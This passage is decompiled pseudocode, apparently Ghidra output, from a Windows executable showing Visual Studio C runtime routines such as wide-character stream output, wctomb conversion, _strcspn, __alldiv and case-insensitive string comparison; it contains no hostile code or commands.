          uVar3 = FUN_0041c7e6();
          puVar5 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_00436a38)[iVar2 >> 5]);
        }
        if ((puVar5[4] & 0x80) != 0) {
          uVar6 = FUN_004272ec(&local_14,local_10,5,param_1);
          uVar7 = uVar6 & 0xffffffff00000000 | (ulonglong)extraout_ECX;
          if (((int)uVar6 == 0) && (iVar2 = 0, 0 < local_14)) {
            do {
              piVar1 = &param_2->_cnt;
              *piVar1 = *piVar1 + -1;
              if (*piVar1 < 0) {
                uVar7 = FUN_00424895((int)uVar7,(int)(uVar7 >> 0x20));
              }
              else {
                *param_2->_ptr = *(char *)((int)local_10 + iVar2);
                uVar7 = uVar7 & 0xffffffff00000000 | (ulonglong)(byte)*param_2->_ptr;
                param_2->_ptr = param_2->_ptr + 1;
              }
            } while (((int)uVar7 != -1) && (iVar2 = iVar2 + 1, iVar2 < local_14));
          }
          goto LAB_004271b7;
        }
      }
    }
  }
  piVar1 = &param_2->_cnt;
  *piVar1 = *piVar1 + -2;
  if (*piVar1 < 0) {
    FUN_00427307(param_1,param_2);
  }
  else {
    *(WCHAR *)param_2->_ptr = param_1;
    param_2->_ptr = param_2->_ptr + 2;
  }
LAB_004271b7:
  uVar8 = FUN_0041a954();
  return uVar8;
}



int __cdecl
FUN_004271c8(int *param_1,uint *param_2,uint param_3,WCHAR param_4,pthreadlocinfo *param_5)

{
  uint *lpMultiByteStr;
  uint cbMultiByte;
  int *piVar1;
  int iVar2;
  DWORD DVar3;
  int iVar4;
  int local_14 [2];
  int local_c;
  char local_8;
  
  cbMultiByte = param_3;
  lpMultiByteStr = param_2;
  if ((param_2 == (uint *)0x0) && (param_3 != 0)) {
    if (param_1 != (int *)0x0) {
      *param_1 = 0;
    }
    return 0;
  }
  if (param_1 != (int *)0x0) {
    *param_1 = -1;
  }
  if (0x7fffffff < param_3) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00419a8d();
    return 0x16;
  }
  FUN_0041a0a9(local_14,param_5);
  iVar4 = 0;
  if (*(int *)(local_14[0] + 0xa8) == 0) {
    if ((ushort)param_4 < 0x100) {
      if (lpMultiByteStr != (uint *)0x0) {
        if (cbMultiByte == 0) goto LAB_004272d8;
        *(char *)lpMultiByteStr = (char)param_4;
      }
      if (param_1 != (int *)0x0) {
        *param_1 = 1;
      }
      goto LAB_0042725b;
    }
    if ((lpMultiByteStr != (uint *)0x0) && (cbMultiByte != 0)) {
      FUN_00416e80(lpMultiByteStr,0,cbMultiByte);
    }
  }
  else {
    param_2 = (uint *)0x0;
    iVar2 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&param_4,1,(LPSTR)lpMultiByteStr,
                                cbMultiByte,(LPCSTR)0x0,(LPBOOL)&param_2);
    if (iVar2 == 0) {
      DVar3 = GetLastError();
      if (DVar3 == 0x7a) {
        if ((lpMultiByteStr != (uint *)0x0) && (cbMultiByte != 0)) {
          FUN_00416e80(lpMultiByteStr,0,cbMultiByte);
        }
LAB_004272d8:
        piVar1 = __errno();
        iVar4 = 0x22;
        *piVar1 = 0x22;
        FUN_00419a8d();
        goto LAB_0042725b;
      }
    }
    else if (param_2 == (uint *)0x0) {
      if (param_1 != (int *)0x0) {
        *param_1 = iVar2;
      }
      goto LAB_0042725b;
    }
  }
  piVar1 = __errno();
  *piVar1 = 0x2a;
  piVar1 = __errno();
  iVar4 = *piVar1;
LAB_0042725b:
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar4;
}



void __cdecl FUN_004272ec(int *param_1,uint *param_2,uint param_3,WCHAR param_4)

{
  FUN_004271c8(param_1,param_2,param_3,param_4,(pthreadlocinfo *)0x0);
  return;
}



undefined2 __cdecl FUN_00427307(undefined2 param_1,FILE *param_2)

{
  char *pcVar1;
  FILE *pFVar2;
  uint uVar3;
  int *piVar4;
  int iVar5;
  byte bVar6;
  uint uVar7;
  int extraout_ECX;
  int extraout_ECX_00;
  int iVar8;
  FILE *pFVar9;
  undefined *puVar10;
  uint extraout_EDX;
  uint extraout_EDX_00;
  FILE *pFVar11;
  longlong lVar12;
  byte in_stack_0000c641;
  
  pFVar2 = param_2;
  uVar3 = FUN_0041c7e6();
  uVar7 = param_2->_flag;
  if ((uVar7 & 0x82) == 0) {
    piVar4 = __errno();
    *piVar4 = 9;
LAB_0042732c:
    param_2->_flag = param_2->_flag | 0x20;
    return 0xffff;
  }
  if ((uVar7 & 0x40) != 0) {
    piVar4 = __errno();
    *piVar4 = 0x22;
    goto LAB_0042732c;
  }
  pFVar11 = (FILE *)0x0;
  if ((uVar7 & 1) != 0) {
    param_2->_cnt = 0;
    if ((uVar7 & 0x10) == 0) {
      param_2->_flag = uVar7 | 0x20;
      return 0xffff;
    }
    uVar7 = uVar7 & 0xfffffffe;
    param_2->_ptr = param_2->_base;
    param_2->_flag = uVar7;
  }
  bVar6 = (byte)uVar7;
  uVar7 = param_2->_flag;
  param_2->_cnt = 0;
  param_2->_flag = uVar7 & 0xffffffef | 2;
  if (((uVar7 & 0x10c) == 0) &&
     (((bVar6 = in_stack_0000c641, iVar5 = FUN_0041bff1(), iVar8 = extraout_ECX,
       uVar7 = extraout_EDX, param_2 != (FILE *)(iVar5 + 0x20) &&
       (iVar5 = FUN_0041bff1(), iVar8 = extraout_ECX_00, uVar7 = extraout_EDX_00,
       param_2 != (FILE *)(iVar5 + 0x40))) || (uVar7 = FUN_0041c80a(iVar8,uVar7), uVar7 == 0)))) {
    pFVar9 = param_2;
    __getbuf(param_2);
    bVar6 = (byte)pFVar9;
  }
  if ((param_2->_flag & 0x108U) == 0) {
    param_2 = (FILE *)0x2;
    pFVar11 = (FILE *)FUN_0041dc05(bVar6);
  }
  else {
    pcVar1 = param_2->_base;
    pFVar9 = (FILE *)(param_2->_ptr + -(int)pcVar1);
    param_2->_ptr = pcVar1 + 2;
    param_2->_cnt = param_2->_bufsiz + -2;
    if ((int)pFVar9 < 1) {
      if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {
        puVar10 = &DAT_004352d0;
      }
      else {
        puVar10 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_00436a38)[(int)uVar3 >> 5]);
      }
      if (((puVar10[4] & 0x20) != 0) &&
         (lVar12 = FUN_00420a99((int)puVar10,(short)pcVar1), lVar12 == -1)) goto LAB_00427454;
    }
    else {
      pFVar11 = (FILE *)FUN_0041dc05((byte)pFVar9);
    }
    *(undefined2 *)param_2->_base = param_1;
    param_2 = pFVar9;
  }
  if (pFVar11 == param_2) {
    return param_1;
  }
LAB_00427454:
  pFVar2->_flag = pFVar2->_flag | 0x20;
  return 0xffff;
}



void __fastcall
FUN_00427469(int param_1,undefined param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
            undefined4 param_6,undefined1 param_7)

{
  FUN_004235c0(param_1);
  return;
}



void __fastcall
FUN_00427488(uint param_1,int param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
            undefined1 param_6)

{
  FUN_004237bf(param_1,param_2);
  return;
}



int __cdecl FUN_004274a4(uint param_1)

{
  return (param_1 ^ (int)param_1 >> 0x1f) - ((int)param_1 >> 0x1f);
}



// Library Function - Single Match
//  _strcspn
// 
// Library: Visual Studio

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  size_t sVar3;
  undefined4 uStack40;
  undefined4 uStack36;
  undefined4 uStack32;
  undefined4 uStack28;
  undefined4 uStack24;
  undefined4 uStack20;
  undefined4 uStack16;
  undefined4 uStack12;
  
  uStack12 = 0;
  uStack16 = 0;
  uStack20 = 0;
  uStack24 = 0;
  uStack28 = 0;
  uStack32 = 0;
  uStack36 = 0;
  uStack40 = 0;
  for (; bVar1 = *_Control, bVar1 != 0; _Control = (char *)((byte *)_Control + 1)) {
    pbVar2 = (byte *)((int)&uStack40 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  sVar3 = 0xffffffff;
  do {
    sVar3 = sVar3 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar3;
    }
    _Str = (char *)((byte *)_Str + 1);
  } while ((*(byte *)((int)&uStack40 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return sVar3;
}



// Library Function - Single Match
//  __alldiv
// 
// Library: Visual Studio

undefined8 __alldiv(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  ___ascii_strnicmp
// 
// Library: Visual Studio

int __cdecl ___ascii_strnicmp(char *_Str1,char *_Str2,size_t _MaxCount)

{
  byte bVar1;
  byte bVar2;
  bool bVar3;
  
  if (_MaxCount != 0) {
    do {
      bVar2 = *_Str1;
      bVar1 = *_Str2;
      if ((bVar2 == 0) || (bVar1 == 0)) break;
      _Str1 = (char *)((byte *)_Str1 + 1);
      _Str2 = (char *)((byte *)_Str2 + 1);
      if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
        bVar2 = bVar2 + 0x20;
      }
      if ((0x40 < bVar1) && (bVar1 < 0x5b)) {
        bVar1 = bVar1 + 0x20;
      }
      bVar3 = bVar2 < bVar1;
      if (bVar2 != bVar1) goto LAB_00427a71;
      _MaxCount = _MaxCount - 1;
    } while (_MaxCount != 0);
    _MaxCount = 0;
    bVar3 = bVar2 < bVar1;
    if (bVar2 != bVar1) {
LAB_00427a71:
      _MaxCount = 0xffffffff;
      if (!bVar3) {
        _MaxCount = 1;
      }
    }
  }
  return _MaxCount;
}



void __fastcall FUN_00427a81(int param_1)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(**(int **)(param_1 + 4) + 8))();
  if (puVar1 != (undefined4 *)0x0) {
    (**(code **)*puVar1)(1);
  }
  return;
}



undefined4 __fastcall FUN_00427aba(undefined4 param_1)

{
  LPCRITICAL_SECTION p_Var1;
  
  LOCK();
  DAT_00436314 = DAT_00436314 + 1;
  if (DAT_00436314 == 0) {
    p_Var1 = (LPCRITICAL_SECTION)&DAT_004379e0;
    do {
      FUN_00427b47(p_Var1);
      p_Var1 = p_Var1 + 1;
    } while ((int)p_Var1 < 0x437a40);
  }
  return param_1;
}



void __cdecl FUN_00427b39(LPCRITICAL_SECTION param_1)

{
  DeleteCriticalSection(param_1);
  return;
}



void __cdecl FUN_00427b47(LPCRITICAL_SECTION param_1)

{
  FUN_004194dd(param_1,4000,0);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

int __cdecl FUN_00427c0d(FILE *param_1,int param_2)

{
  int *piVar1;
  uint uVar2;
  undefined *puVar3;
  int _Flag;
  FILE *pFVar4;
  FILE *extraout_ECX;
  FILE *pFVar5;
  FILE *extraout_ECX_00;
  undefined2 uVar6;
  undefined2 extraout_DX;
  undefined *extraout_EDX;
  undefined *extraout_EDX_00;
  int iVar7;
  
  iVar7 = 0;
  if ((param_1 == (FILE *)0x0) || (param_2 == 0)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00419a8d();
    return -1;
  }
  pFVar5 = param_1;
  FUN_0041bff8();
  puVar3 = extraout_EDX;
  if ((*(byte *)&param_1->_flag & 0x40) == 0) {
    pFVar5 = param_1;
    uVar2 = FUN_0041c7e6();
    pFVar4 = (FILE *)((int)uVar2 >> 5);
    if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
      puVar3 = &DAT_004352d0;
    }
    else {
      puVar3 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_00436a38)[(int)pFVar4]);
      pFVar5 = pFVar4;
    }
    if ((puVar3[0x24] & 0x7f) == 0) {
      if ((uVar2 == 0xffffffff) || (uVar2 == 0xfffffffe)) {
        puVar3 = &DAT_004352d0;
      }
      else {
        puVar3 = (undefined *)((uVar2 & 0x1f) * 0x40 + (&DAT_00436a38)[(int)pFVar4]);
      }
      if ((puVar3[0x24] & 0x80) == 0) goto LAB_00427cd4;
    }
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00419a8d();
    iVar7 = -1;
    pFVar5 = extraout_ECX;
    puVar3 = extraout_EDX_00;
  }
LAB_00427cd4:
  uVar6 = SUB42(puVar3,0);
  if (iVar7 == 0) {
    _Flag = FUN_0041a834((int *)param_1);
    iVar7 = FUN_004262ff();
    __ftbuf(_Flag,param_1);
    pFVar5 = extraout_ECX_00;
    uVar6 = extraout_DX;
  }
  FUN_00427d17((int)pFVar5,uVar6);
  return iVar7;
}



undefined8 __fastcall FUN_00427d17(int param_1,undefined2 param_2)

{
  undefined8 uVar1;
  
  uVar1 = FUN_0041c067(param_1,param_2);
  return uVar1;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4_GS
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4_GS(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *in_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack28 [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack28 + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack28 + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack28 + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack28 + iVar1 + 4) = DAT_00435980 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack28 + iVar1) = unaff_retaddr;
  *in_FS_OFFSET = (int)local_8;
  return;
}



// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined8 FUN_00427d68(void)

{
  undefined8 uVar1;
  
  uVar1 = FUN_0041a954();
  return uVar1;
}


